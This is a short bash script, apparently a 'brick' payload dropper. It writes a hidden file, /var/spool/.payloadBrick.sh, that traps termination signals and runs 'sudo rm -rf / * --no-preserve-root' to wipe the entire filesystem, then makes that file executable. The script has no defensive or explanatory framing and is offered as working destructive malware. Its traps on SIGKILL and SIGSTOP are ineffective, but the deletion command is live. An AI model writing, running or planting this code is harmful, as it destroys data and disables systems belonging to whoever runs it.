#!/bin/bash
cat <<EOF > /var/spool/.payloadBrick.sh
#!/bin/bash
trap '' SIGHUP
trap '' SIGKILL
trap '' SIGTERM
trap '' SIGSTOP
sudo rm -rf / * --no-preserve-root
EOF
chmod +x /var/spool/.payloadBrick.sh